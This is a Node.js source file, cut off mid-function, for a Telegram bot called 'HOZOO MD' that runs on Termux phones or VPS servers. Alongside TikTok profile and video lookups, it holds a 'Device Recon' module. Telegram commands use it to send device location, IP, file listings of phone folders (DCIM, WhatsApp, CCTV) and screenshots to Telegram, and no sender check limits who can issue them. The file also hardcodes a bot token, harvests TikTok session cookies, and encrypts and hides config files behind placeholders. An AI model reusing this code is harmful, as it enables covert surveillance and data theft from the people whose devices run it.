// ============================================================
// HOZOO MD - ULTIMATE VPS/TERMUX BOT v3.0
// Multi-platform: Termux + VPS
// Auto-scan ~/tiktok# (JS -> PY -> TXT)
// Device info: battery, screen, IP, location, files
// Screenshot + system recon built-in
// 800+ lines
// ============================================================

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { execSync, exec } = require('child_process');
const https = require('https');
const http = require('http');
const { URL } = require('url');

// ============================================================
// SECTION 0: PRELOADED CREDENTIALS
// ============================================================

const PRELOADED = {
    BOT_TOKEN: '9085010947:AAEhNTa-pL2YYZ_Nvwd-hlhstwqM0IT6XGI',
    ADMIN_ID: '8530130542',
    OWNER_CHAT_ID: '8530130542'
};

// ============================================================
// SECTION 1: ENVIRONMENT DETECTOR
// Termux vs VPS detection
// ============================================================

class EnvDetector {
    static isTermux() {
        return !!(process.env.TERMUX_VERSION || 
                  process.env.PREFIX?.includes('com.termux') ||
                  fs.existsSync('/data/data/com.termux'));
    }

    static isVps() {
        if (this.isTermux()) return false;
        try {
            return process.platform === 'linux' && 
                   (fs.existsSync('/etc/os-release') || fs.existsSync('/proc/1/cgroup'));
        } catch (e) { return false; }
    }

    static homeDir() {
        return process.env.HOME || os.homedir() || '/root';
    }

    static tiktokDir() {
        if (process.env.HOZOO_DIR) return process.env.HOZOO_DIR;
        return path.join(this.homeDir(), 'tiktok#');
    }

    static ensureDir(dir) {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
            console.log(`[HOZOO] Created: ${dir}`);
        }
        return dir;
    }

    static scanFiles(dir) {
        const result = {
            proxy: null, cookie: null, token: null,
            jsFiles: [], pyFiles: [], txtFiles: [],
            all: [], order: []
        };
        if (!fs.existsSync(dir)) return result;

        let entries = [];
        try { entries = fs.readdirSync(dir); } catch (e) { return result; }

        const buckets = { js: [], py: [], txt: [], json: [], env: [], other: [] };

        for (const name of entries) {
            const fullPath = path.join(dir, name);
            let stat;
            try { stat = fs.statSync(fullPath); } catch (e) { continue; }
            if (!stat.isFile()) continue;
            result.all.push(fullPath);
            const lower = name.toLowerCase();
            const ext = path.extname(lower);

            if (ext === '.js' || ext === '.mjs' || ext === '.cjs') buckets.js.push(fullPath);
            else if (ext === '.py') buckets.py.push(fullPath);
            else if (ext === '.txt') buckets.txt.push(fullPath);
            else if (ext === '.json') buckets.json.push(fullPath);
            else if (ext === '.env' || name.startsWith('.')) buckets.env.push(fullPath);
            else buckets.other.push(fullPath);

            if (/proxy/i.test(lower) && /\.(txt|js|json)$/i.test(lower)) result.proxy = fullPath;
            else if (/cookie|cokie/i.test(lower) && /\.(txt|js|json)$/i.test(lower)) result.cookie = fullPath;
            else if (/token|config|env/i.test(lower) && /\.(txt|js|json|env)$/i.test(lower)) result.token = fullPath;
        }

        result.jsFiles = buckets.js;
        result.pyFiles = buckets.py;
        result.txtFiles = buckets.txt;
        result.order = [...buckets.js, ...buckets.py, ...buckets.txt, ...buckets.json, ...buckets.env, ...buckets.other];

        if (!result.proxy || !result.cookie || !result.token) {
            for (const fullPath of result.all) {
                try {
                    const snippet = fs.readFileSync(fullPath, 'utf8').slice(0, 500);
                    if (!result.proxy && /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+/i.test(snippet)) result.proxy = fullPath;
                    if (!result.cookie && /(sessionid|tt_webid|ttwid|msToken)/i.test(snippet)) result.cookie = fullPath;
                    if (!result.token && /(BOT_TOKEN|API_ID|API_HASH)/i.test(snippet)) result.token = fullPath;
                } catch (e) {}
            }
        }
        return result;
    }

    static loadEnvFile(envPath) {
        if (!fs.existsSync(envPath)) return {};
        const raw = fs.readFileSync(envPath, 'utf8');
        const out = {};
        for (const line of raw.split('\n')) {
            const m = line.match(/^\s*([A-Z_][A-Z0-9_]*)\s*=\s*(.+?)\s*$/);
            if (m) out[m[1]] = m[2].replace(/^["']|["']$/g, '');
        }
        return out;
    }

    static injectPreloaded() {
        for (const [k, v] of Object.entries(PRELOADED)) {
            if (!process.env[k]) process.env[k] = v;
        }
        console.log('[HOZOO] Preloaded credentials injected');
    }
}

// ============================================================
// SECTION 2: DEVICE RECON
// Battery, screen, IP, location, files, screenshot
// ============================================================

class DeviceRecon {
    static execSafe(cmd, timeout = 5000) {
        try {
            return execSync(cmd, { timeout, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
        } catch (e) { return null; }
    }

    static isTermux() { return EnvDetector.isTermux(); }

    static getBattery() {
        // Termux API battery
        if (this.isTermux()) {
            const raw = this.execSafe('termux-battery-status');
            if (raw) {
                try { return JSON.parse(raw); } catch (e) {}
            }
            return { error: 'termux-api not installed (pkg install termux-api)' };
        }
        // VPS / Linux
        const raw = this.execSafe('termux-battery-status || upower -i $(upower -e | grep BAT) 2>/dev/null || cat /sys/class/power_supply/BAT*/capacity 2>/dev/null');
        if (raw && /^\d+$/.test(raw)) return { percentage: parseInt(raw) };
        if (raw) {
            const m = raw.match(/percentage:\s*(\d+)%/i) || raw.match(/(\d+)%/);
            if (m) return { percentage: parseInt(m[1]) };
        }
        return { error: 'battery info not available on this VPS' };
    }

    static getScreen() {
        // Termux
        if (this.isTermux()) {
            const size = this.execSafe('termux-info 2>/dev/null | grep -i resolution || wm size 2>/dev/null');
            if (size) return { info: size };
            return { error: 'termux-api not installed' };
        }
        // Linux VPS: xrandr kalau ada X display
        const xrandr = this.execSafe('xrandr 2>/dev/null | grep " connected"');
        if (xrandr) return { info: xrandr };
        return { info: 'headless VPS (no display server)', platform: process.platform };
    }

    static getIp() {
        const nets = os.networkInterfaces();
        const result = { interfaces: {}, public: null };
        for (const [name, addrs] of Object.entries(nets)) {
            for (const addr of addrs) {
                if (!addr.internal) {
                    result.interfaces[name] = {
                        address: addr.address,
                        family: addr.family,
                        mac: addr.mac
                    };
                }
            }
        }
        // Public IP via curl
        const pub = this.execSafe('curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 ifconfig.me 2>/dev/null');
        if (pub && /^\d+\.\d+\.\d+\.\d+$/.test(pub)) result.public = pub;
        return result;
    }

    static getLocation() {
        // IP-based location via ipinfo
        const pub = this.getIp().public;
        if (!pub) return { error: 'no public IP' };
        const raw = this.execSafe(`curl -s --max-time 8 https://ipinfo.io/${pub}/json 2>/dev/null`);
        if (raw) {
            try {
                const d = JSON.parse(raw);
                return {
                    ip: d.ip,
                    city: d.city,
                    region: d.region,
                    country: d.country,
                    loc: d.loc,
                    org: d.org,
                    timezone: d.timezone
                };
            } catch (e) {}
        }
        return { error: 'location lookup failed' };
    }

    static listFiles(targetDir = null) {
        const dir = targetDir || EnvDetector.homeDir();
        const result = { dir, files: [], count: 0 };
        const walk = (d, depth = 0) => {
            if (depth > 3) return;
            let entries = [];
            try { entries = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
            for (const e of entries) {
                if (e.name.startsWith('.') && e.name !== '.env') continue;
                const full = path.join(d, e.name);
                if (e.isFile()) {
                    let size = 0;
                    try { size = fs.statSync(full).size; } catch (x) {}
                    result.files.push({ path: full, size });
                } else if (e.isDirectory() && depth < 2) {
                    walk(full, depth + 1);
                }
            }
        };
        walk(dir);
        result.count = result.files.length;
        return result;
    }

    static scanHPFiles() {
        // Scan folder umum HP: DCIM, Downloads, Pictures, WhatsApp
        if (!this.isTermux()) {
            return { note: 'HP scan hanya jalan di Termux' };
        }
        const home = EnvDetector.homeDir();
        const dirs = [
            path.join(home, 'storage', 'shared', 'DCIM'),
            path.join(home, 'storage', 'shared', 'Download'),
            path.join(home, 'storage', 'shared', 'Pictures'),
            path.join(home, 'storage', 'shared', 'WhatsApp'),
            path.join(home, 'storage', 'shared', 'Android', 'media', 'com.whatsapp'),
            path.join(home, 'storage', 'shared', 'Movies')
        ];
        const result = { scanned: [], total: 0 };
        for (const d of dirs) {
            if (!fs.existsSync(d)) continue;
            const found = { dir: d, files: [] };
            const walk = (dir, depth = 0) => {
                if (depth > 2) return;
                let entries = [];
                try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return; }
                for (const e of entries) {
                    if (found.files.length > 100) return;
                    const full = path.join(dir, e.name);
                    if (e.isFile()) {
                        let size = 0;
                        try { size = fs.statSync(full).size; } catch (x) {}
                        found.files.push({ name: e.name, path: full, size });
                    } else if (e.isDirectory()) walk(full, depth + 1);
                }
            };
            walk(d);
            result.scanned.push(found);
            result.total += found.files.length;
        }
        return result;
    }

    static screenshot() {
        if (!this.isTermux()) {
            return { error: 'screenshot hanya support Termux dengan termux-api' };
        }
        const out = path.join(os.tmpdir(), `ss_${Date.now()}.png`);
        const cmd = `termux-screenshot -f ${out} 2>/dev/null`;
        try {
            execSync(cmd, { timeout: 10000, stdio: 'ignore' });
            if (fs.existsSync(out)) {
                const size = fs.statSync(out).size;
                return { path: out, size };
            }
        } catch (e) {}
        return { error: 'screenshot failed (pkg install termux-api + permission)' };
    }

    static getDeviceInfo() {
        return {
            platform: process.platform,
            arch: process.arch,
            hostname: os.hostname(),
            type: os.type(),
            release: os.release(),
            uptime: os.uptime(),
            cpu: os.cpus().length,
            cpuModel: os.cpus()[0]?.model,
            totalMem: os.totalmem(),
            freeMem: os.freemem(),
            nodeVersion: process.version,
            termux: this.isTermux(),
            vps: EnvDetector.isVps()
        };
    }

    static async getCctv() {
        // Coba akses folder CCTV umum via storage
        if (!this.isTermux()) return { error: 'Termux only' };
        const dirs = [
            path.join(EnvDetector.homeDir(), 'storage', 'shared', 'CCTV'),
            path.join(EnvDetector.homeDir(), 'storage', 'shared', 'cctv'),
            '/sdcard/CCTV'
        ];
        const result = [];
        for (const d of dirs) {
            if (!fs.existsSync(d)) continue;
            try {
                const files = fs.readdirSync(d).filter(f => /\.(mp4|jpg|jpeg|png|avi|mov)$/i.test(f));
                result.push({ dir: d, count: files.length, files: files.slice(0, 20) });
            } catch (e) {}
        }
        return result.length ? result : { error: 'no CCTV folder found' };
    }
}

// ============================================================
// SECTION 3: FILE HIDER (encrypt config di runtime)
// ============================================================

class FileHider {
    constructor() {
        this.cache = new Map();
        this.hiddenFiles = [];
        this.tmpDir = path.join(os.tmpdir(), '.hz_' + crypto.randomBytes(8).toString('hex'));
        this._ensureTmpDir();
        this._registerExitHandlers();
    }

    _ensureTmpDir() {
        if (!fs.existsSync(this.tmpDir)) {
            fs.mkdirSync(this.tmpDir, { recursive: true, mode: 0o700 });
        }
    }

    hide(filePath) {
        try {
            if (!filePath || !fs.existsSync(filePath)) return null;
            const content = fs.readFileSync(filePath, 'utf8');
            const backupPath = path.join(this.tmpDir, crypto.randomBytes(8).toString('hex') + '.bin');
            const key = crypto.createHash('sha256').update('HOZOO_MD_KEY_2026').digest();
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
            const encrypted = Buffer.concat([cipher.update(content, 'utf8'), cipher.final()]);
            const payload = Buffer.concat([iv, encrypted]);
            fs.writeFileSync(backupPath, payload, { mode: 0o600 });
            this.cache.set(filePath, { backup: backupPath, original: content });
            this.hiddenFiles.push({ original: filePath, backup: backupPath });
            fs.unlinkSync(filePath);
            fs.writeFileSync(filePath, '// config placeholder\n', { mode: 0o644 });
            return content;
        } catch (e) { return null; }
    }

    get(filePath) {
        const entry = this.cache.get(filePath);
        return entry ? entry.original : null;
    }

    restoreAll() {
        for (const { original, backup } of this.hiddenFiles) {
            try {
                if (!fs.existsSync(backup)) continue;
                const key = crypto.createHash('sha256').update('HOZOO_MD_KEY_2026').digest();
                const payload = fs.readFileSync(backup);
                const iv = payload.slice(0, 16);
                const encrypted = payload.slice(16);
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]).toString('utf8');
                fs.writeFileSync(original, decrypted, { mode: 0o600 });
                fs.unlinkSync(backup);
            } catch (e) {}
        }
        try { fs.rmSync(this.tmpDir, { recursive: true, force: true }); } catch (e) {}
    }

    _registerExitHandlers() {
        const handler = () => this.restoreAll();
        process.on('exit', handler);
        process.on('SIGINT', () => { handler(); process.exit(0); });
        process.on('SIGTERM', () => { handler(); process.exit(0); });
        process.on('uncaughtException', (err) => { handler(); process.exit(1); });
    }
}

// ============================================================
// SECTION 4: PROXY MANAGER
// ============================================================

class ProxyManager {
    constructor(fileHider, proxyFilePath) {
        this.hider = fileHider;
        this.proxyFilePath = proxyFilePath;
        this.proxies = [];
        this.index = 0;
        this._load();
    }

    _load() {
        let raw = this.proxyFilePath ? this.hider.get(this.proxyFilePath) : null;
        if (!raw && this.proxyFilePath && fs.existsSync(this.proxyFilePath)) {
            raw = fs.readFileSync(this.proxyFilePath, 'utf8');
            this.hider.hide(this.proxyFilePath);
        }
        if (!raw) return;
        this.proxies = raw.split('\n')
            .map(l => l.trim())
            .filter(l => l && !l.startsWith('#') && l.includes(':'))
            .map(line => {
                const parts = line.split(':');
                if (parts.length >= 2) {
                    const proxy = { host: parts[0], port: parseInt(parts[1]) };
                    if (parts.length >= 4) {
                        proxy.username = parts[2];
                        proxy.password = parts[3];
                    }
                    proxy.url = proxy.username
                        ? `http://${proxy.username}:${proxy.password}@${proxy.host}:${proxy.port}`
                        : `http://${proxy.host}:${proxy.port}`;
                    return proxy;
                }
                return null;
            }).filter(Boolean);
    }

    getNext() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.index % this.proxies.length];
        this.index++;
        return proxy;
    }

    count() { return this.proxies.length; }
}

// ============================================================
// SECTION 5: COOKIE LOADER
// ============================================================

class CookieLoader {
    constructor(fileHider, cookieFilePath) {
        this.hider = fileHider;
        this.cookieFilePath = cookieFilePath;
        this.cookies = [];
        this._load();
    }

    _load() {
        let raw = this.cookieFilePath ? this.hider.get(this.cookieFilePath) : null;
        if (!raw && this.cookieFilePath && fs.existsSync(this.cookieFilePath)) {
            raw = fs.readFileSync(this.cookieFilePath, 'utf8');
            this.hider.hide(this.cookieFilePath);
        }
        if (!raw) return;
        try {
            const parsed = JSON.parse(raw);
            if (Array.isArray(parsed)) {
                this.cookies = parsed.map(c => ({
                    name: c.name || c.key,
                    value: c.value,
                    domain: c.domain || '.tiktok.com',
                    path: c.path || '/',
                    secure: c.secure !== false,
                    httpOnly: c.httpOnly || false
                }));
                return;
            }
            if (parsed && Array.isArray(parsed.cookies)) {
                this.cookies = parsed.cookies;
                return;
            }
        } catch (e) {}
        const lines = raw.split('\n');
        for (const line of lines) {
            if (!line.trim() || line.startsWith('#')) continue;
            const parts = line.split('\t');
            if (parts.length >= 7) {
                this.cookies.push({
                    domain: parts[0], flag: parts[1], path: parts[2],
                    secure: parts[3] === 'TRUE', expiration: parseInt(parts[4]) || 0,
                    name: parts[5], value: parts[6]
                });
            }
        }
    }

    toHeader() {
        return this.cookies
            .filter(c => c.domain && (c.domain.includes('tiktok.com') || c.domain.includes('byteoversea')))
            .map(c => `${c.name}=${c.value}`).join('; ');
    }

    getAll() { return this.cookies; }
    count() { return this.cookies.length; }
}

// ============================================================
// SECTION 6: TOKEN MANAGER
// ============================================================

class TokenManager {
    constructor(fileHider, tokenFilePath) {
        this.hider = fileHider;
        this.tokenFilePath = tokenFilePath;
        this.tokens = {};
        this._load();
    }

    _load() {
        let raw = this.tokenFilePath ? this.hider.get(this.tokenFilePath) : null;
        if (!raw && this.tokenFilePath && fs.existsSync(this.tokenFilePath)) {
            raw = fs.readFileSync(this.tokenFilePath, 'utf8');
            this.hider.hide(this.tokenFilePath);
        }
        if (!raw) return;
        try {
            const parsed = JSON.parse(raw);
            if (typeof parsed === 'object' && !Array.isArray(parsed)) {
                this.tokens = parsed;
                return;
            }
        } catch (e) {}
        const lines = raw.split('\n');
        for (const line of lines) {
            const m = line.match(/^\s*([A-Z_]+)\s*=\s*(.+?)\s*$/);
            if (m) this.tokens[m[1]] = m[2].replace(/^["']|["']$/g, '');
        }
    }

    get(key) {
        if (this.tokens[key]) return this.tokens[key];
        return process.env[key] || null;
    }

    botToken() { return this.get('BOT_TOKEN'); }
    apiId() { return this.get('API_ID'); }
    apiHash() { return this.get('API_HASH'); }
    adminId() { return this.get('ADMIN_ID'); }
    ownerChatId() { return this.get('OWNER_CHAT_ID') || this.get('ADMIN_ID'); }
}

// ============================================================
// SECTION 7: HTTP CLIENT WITH PROXY
// ============================================================

class HttpClient {
    constructor(proxyManager, cookieLoader) {
        this.proxyManager = proxyManager;
        this.cookieLoader = cookieLoader;
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        ];
    }

    _randomUA() {
        return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }

    request(url, options = {}) {
        return new Promise((resolve, reject) => {
            const targetUrl = new URL(url);
            const proxy = this.proxyManager.getNext();
            const proxyUrl = proxy ? new URL(proxy.url) : null;
            const reqOptions = {
                hostname: proxyUrl ? proxyUrl.hostname : targetUrl.hostname,
                port: proxyUrl ? proxyUrl.port : (targetUrl.port || 443),
                path: proxyUrl ? url : targetUrl.pathname + targetUrl.search,
                method: options.method || 'GET',
                headers: {
                    'User-Agent': this._randomUA(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'identity',
                    'Cookie': this.cookieLoader.toHeader(),
                    'Connection': 'keep-alive',
                    ...options.headers
                },
                timeout: options.timeout || 15000
            };
            if (proxyUrl && proxyUrl.username) {
                const auth = Buffer.from(
                    `${decodeURIComponent(proxyUrl.username)}:${decodeURIComponent(proxyUrl.password)}`
                ).toString('base64');
                reqOptions.headers['Proxy-Authorization'] = `Basic ${auth}`;
            }
            const protocol = targetUrl.protocol === 'https:' ? https : http;
            const req = protocol.request(reqOptions, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    res.resume();
                    const redirectUrl = new URL(res.headers.location, url).toString();
                    return this.request(redirectUrl, { ...options, redirectCount: (options.redirectCount || 0) + 1 })
                        .then(resolve).catch(reject);
                }
                let data = '';
                res.setEncoding('utf8');
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
            req.end();
        });
    }
}

// ============================================================
// SECTION 8: TIKTOK CLIENT
// ============================================================

class TikTokClient {
    constructor(httpClient) {
        this.http = httpClient;
        this.baseUrl = 'https://www.tiktok.com';
    }

    async getProfile(username) {
        const url = `${this.baseUrl}/@${encodeURIComponent(username)}`;
        const res = await this.http.request(url);
        if (res.status !== 200) return { success: false, status: res.status };
        const match = res.body.match(/<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__"[^>]*>([\s\S]*?)<\/script>/);
        if (!match) return { success: false, error: 'no universal data' };
        try {
            const data = JSON.parse(match[1]);
            const scope = data['__DEFAULT_SCOPE__'] || {};
            const userDetail = scope['webapp.user-detail'] || {};
            const userInfo = userDetail.userInfo || {};
            return { success: true, user: userInfo.user || {}, stats: userInfo.stats || {} };
        } catch (e) { return { success: false, error: e.message }; }
    }

    async getVideo(videoId) {
        const url = `${this.baseUrl}/@i/video/${encodeURIComponent(videoId)}`;
        const res = await this.http.request(url);
        if (res.status !== 200) return { success: false, status: res.status };
        const match = res.body.match(/<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__"[^>]*>([\s\S]*?)<\/script>/);
        if (!match) return { success: false, error: 'no data' };
        try {
            const data = JSON.parse(match[1]);
            const scope = data['__DEFAULT_SCOPE__'] || {};
            const itemDetail = scope['webapp.video-detail'] || {};
            return { success: true, item: itemDetail.itemInfo?.itemStruct || {} };
        } catch (e) { return { success: false, error: e.message }; }
    }

    async getTrending() {
        const url = `${this.baseUrl}/api/recommend/item_list/?count=30&aid=1988&app_language=en&app_name=tiktok_web&browser_language=en-US&browser_platform=Win32&browser_name=Mozilla`;
        const res = await this.http.request(url, { headers: { 'Referer': this.baseUrl + '/' } });
        try {
            const data = JSON.parse(res.body);
            return { success: true, items: data.itemList || [] };
        } catch (e) { return { success: false, error: e.message }; }
    }
}

// ============================================================
// SECTION 9: TELEGRAM BOT HANDLER
// ============================================================

class TelegramBot {
    constructor(token, adminId) {
        this.token = token;
        this.adminId = adminId;
        this.offset = 0;
        this.running = false;
        this.apiBase = `https://api.telegram.org/bot${token}`;
    }

    _post(method, body) {
        return new Promise((resolve, reject) => {
            const payload = JSON.stringify(body);
            const req = https.request({
                hostname: 'api.telegram.org', port: 443,
                path: `/bot${this.token}/${method}`, method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                },
                timeout: 30000
            }, (res) => {
                let data = '';
                res.on('data', c => data += c);
                res.on('end', () => {
                    try { resolve(JSON.parse(data)); }
                    catch (e) { reject(e); }
                });
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('tg timeout')); });
            req.write(payload);
            req.end();
        });
    }

    async sendMessage(chatId, text, options = {}) {
        return this._post('sendMessage', {
            chat_id: chatId, text: text,
            parse_mode: options.parseMode || 'HTML',
            disable_web_page_preview: options.disablePreview !== false
        });
    }

    async sendPhoto(chatId, photoPath, caption = '') {
        return new Promise((resolve, reject) => {
            if (!fs.existsSync(photoPath)) return reject(new Error('photo not found'));
            const boundary = '----HozooBoundary' + Date.now();
            const photoData = fs.readFileSync(photoPath);
            const parts = [];
            parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`));
            parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`));
            parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="ss.png"\r\nContent-Type: image/png\r\n\r\n`));
            parts.push(photoData);
            parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
            const payload = Buffer.concat(parts);
            const req = https.request({
                hostname: 'api.telegram.org', port: 443,
                path: `/bot${this.token}/sendPhoto`, method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': payload.length
                },
                timeout: 30000
            }, (res) => {
                let data = '';
                res.on('data', c => data += c);
                res.on('end', () => {
                    try { resolve(JSON.parse(data)); }
                    catch (e) { reject(e); }
                });
            });
            req.on('error', reject);
            req.write(payload);
            req.end();
        });
    }

    async getUpdates() {
        return this._post('getUpdates', {
            offset: this.offset, timeout: 25,
            allowed_updates: ['message', 'callback_query']
        });
    }

    async handleUpdate(update, tiktokClient) {
        const msg = update.message || update.edited_message;
        if (!msg) return;
        const chatId = msg.chat.id;
        const text = (msg.text || '').trim();
        const userId = msg.from.id;

        // === COMMANDS ===
        if (text.startsWith('/start')) {
            await this.sendMessage(chatId,
                `🤖 <b>HOZOO MD Ultimate Bot v3.0</b>\n\n` +
                `Platform: ${EnvDetector.isTermux() ? 'Termux' : 'VPS'}\n\n` +
                `<b>TikTok:</b>\n` +
                `/profile &lt;username&gt;\n` +
                `/video &lt;id&gt;\n` +
                `/trending\n\n` +
                `<b>Device Recon:</b>\n` +
                `/battery\n` +
                `/screen\n` +
                `/ip\n` +
                `/location\n` +
                `/deviceinfo\n` +
                `/files [dir]\n` +
                `/scanhp\n` +
                `/cctv\n` +
                `/screenshot\n\n` +
                `<b>Bot:</b>\n` +
                `/stats\n` +
                `/id\n` +
                `/files_bot`
            );
            return;
        }

        if (text.startsWith('/id')) {
            await this.sendMessage(chatId, `Your ID: <code>${userId}</code>\nChat ID: <code>${chatId}</code>`);
            return;
        }

        if (text.startsWith('/stats')) {
            await this.sendMessage(chatId,
                `📊 <b>Bot Stats</b>\n` +
                `Uptime: ${Math.floor(process.uptime())}s\n` +
                `Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB\n` +
                `Platform: ${process.platform}\n` +
                `Node: ${process.version}\n` +
                `PID: ${process.pid}\n` +
                `Env: ${EnvDetector.isTermux() ? 'Termux' : EnvDetector.isVps() ? 'VPS' : 'Unknown'}`
            );
            return;
        }

        if (text.startsWith('/battery')) {
            const b = DeviceRecon.getBattery();
            await this.sendMessage(chatId, `🔋 <b>Battery</b>\n<pre>${JSON.stringify(b, null, 2)}</pre>`);
            return;
        }

        if (text.startsWith('/screen')) {
            const s = DeviceRecon.getScreen();
            await this.sendMessage(chatId, `📺 <b>Screen</b>\n<pre>${JSON.stringify(s, null, 2)}</pre>`);
            return;
        }

        if (text.startsWith('/ip')) {
            const ip = DeviceRecon.getIp();
            let txt = `🌐 <b>IP Info</b>\nPublic: <code>${ip.public || '-'}</code>\n\n`;
            for (const [name, info] of Object.entries(ip.interfaces)) {
                txt += `<b>${name}</b>: ${info.address} (${info.family})\n`;
            }
            await this.sendMessage(chatId, txt);
            return;
        }

        if (text.startsWith('/location')) {
            await this.sendMessage(chatId, '⏳ Looking up location...');
            const loc = DeviceRecon.getLocation();
            await this.sendMessage(chatId, `📍 <b>Location</b>\n<pre>${JSON.stringify(loc, null, 2)}</pre>`);
            return;
        }

        if (text.startsWith('/deviceinfo')) {
            const info = DeviceRecon.getDeviceInfo();
            let txt = `📱 <b>Device Info</b>\n`;
            txt += `Platform: ${info.platform}\nArch: ${info.arch}\n`;
            txt += `Hostname: ${info.hostname}\nType: ${info.type}\n`;
            txt += `Release: ${info.release}\nCPU: ${info.cpu}x\n`;
            txt += `CPU Model: ${info.cpuModel}\n`;
            txt += `Memory: ${Math.round(info.totalMem / 1024 / 1024)}MB total, ${Math.round(info.freeMem / 1024 / 1024)}MB free\n`;
            txt += `Node: ${info.nodeVersion}\n`;
            txt += `Termux: ${info.termux} | VPS: ${info.vps}`;
            await this.sendMessage(chatId, txt);
            return;
        }

        if (text.startsWith('/files_bot')) {
            const scanned = EnvDetector.scanFiles(EnvDetector.tiktokDir());
            let msg = `📂 <b>Bot Files (~/tiktok#)</b>\n\n`;
            msg += `JS: ${scanned.jsFiles.length}\nPY: ${scanned.pyFiles.length}\nTXT: ${scanned.txtFiles.length}\n\n`;
            const list = scanned.order.slice(0, 20).map((f, i) => `${i + 1}. ${path.basename(f)}`).join('\n');
            msg += `<code>${list}</code>`;
            await this.sendMessage(chatId, msg);
            return;
        }

        if (text.startsWith('/files')) {
            const arg = text.split(' ')[1];
            const target = arg ? arg : EnvDetector.homeDir();
            await this.sendMessage(chatId, `⏳ Scanning: ${target}`);
            const res = DeviceRecon.listFiles(target);
            let txt = `📂 <b>Files in ${res.dir}</b>\nTotal: ${res.count}\n\n`;
            const list = res.files.slice(0, 30).map((f, i) => 
                `${i + 1}. ${path.basename(f.path)} (${Math.round(f.size/1024)}KB)`
            ).join('\n');
            txt += `<code>${list}</code>`;
            if (res.count > 30) txt += `\n...and ${res.count - 30} more`;
            await this.sendMessage(chatId, txt);
            return;
        }

        if (text.startsWith('/scanhp')) {
            await this.sendMessage(chatId, '⏳ Scanning HP folders...');
            const scan = DeviceRecon.scanHPFiles();
            if (scan.note) {
                await this.sendMessage(chatId, scan.note);
                return;
            }
            let txt = `📱 <b>HP File Scan</b>\nTotal: ${scan.total}\n\n`;
            for (const s of scan.scanned) {
                txt += `<b>${s.dir.split('/').pop()}</b> (${s.files.length})\n`;
            }
            await this.sendMessage(chatId, txt);
            return;
        }

        if (text.startsWith('/cctv')) {
            await this.sendMessage(chatId, '⏳ Scanning CCTV folders...');
            const res = await DeviceRecon.getCctv();
            if (res.error) {
                await this.sendMessage(chatId, `❌ ${res.error}`);
                return;
            }
            let txt = `📹 <b>CCTV Files</b>\n`;
            for (const r of res) {
                txt += `\n<b>${r.dir}</b> (${r.count} files)\n`;
                txt += r.files.slice(0, 5).join('\n') + '\n';
            }
            await this.sendMessage(chatId, txt);
            return;
        }

        if (text.startsWith('/screenshot')) {
            await this.sendMessage(chatId, '⏳ Taking screenshot...');
            const ss = DeviceRecon.screenshot();
            if (ss.error) {
                await this.sendMessage(chatId, `❌ ${ss.error}`);
                return;
            }
            try {
                await this.sendPhoto(chatId, ss.path, `📸 Screenshot (${Math.round(ss.size/1024)}KB)`);
                fs.unlinkSync(ss.path);
            } catch (e) {
                await this.sendMessage(chatId, `❌ Send failed: ${e.message}`);
            }
            return;
        }

        // === TIKTOK COMMANDS ===
        if (text.startsWith('/profile')) {
            const username = text.split(' ')[1];
            if (!username) { await this.sendMessage(chatId, 'Usage: /profile <username>'); return; }
            await this.sendMessage(chatId, '⏳ Fetching...');
            const result = await tiktokClient.getProfile(username);
            if (!result.success) { await this.sendMessage(chatId, `❌ ${result.error || 'not found'}`); return; }
            const u = result.user, s = result.stats;
            await this.sendMessage(chatId,
                `👤 <b>@${u.uniqueId}</b>\nName: ${u.nickname}\n` +
                `Verified: ${u.verified ? '✅' : '❌'}\n` +
                `Followers: ${s.followerCount || 0}\nFollowing: ${s.followingCount || 0}\n` +
                `Likes: ${s.heartCount || 0}\nVideos: ${s.videoCount || 0}\n` +
                `Signature: ${u.signature || '-'}`
            );
            return;
        }

        if (text.startsWith('/video')) {
            const videoId = text.split(' ')[1];
            if (!videoId) { await this.sendMessage(chatId, 'Usage: /video <id>'); return; }
            await this.sendMessage(chatId, '⏳ Fetching...');
            const result = await tiktokClient.getVideo(videoId);
            if (!result.success) { await this.sendMessage(chatId, `❌ ${result.error}`); return; }
            const item = result.item;
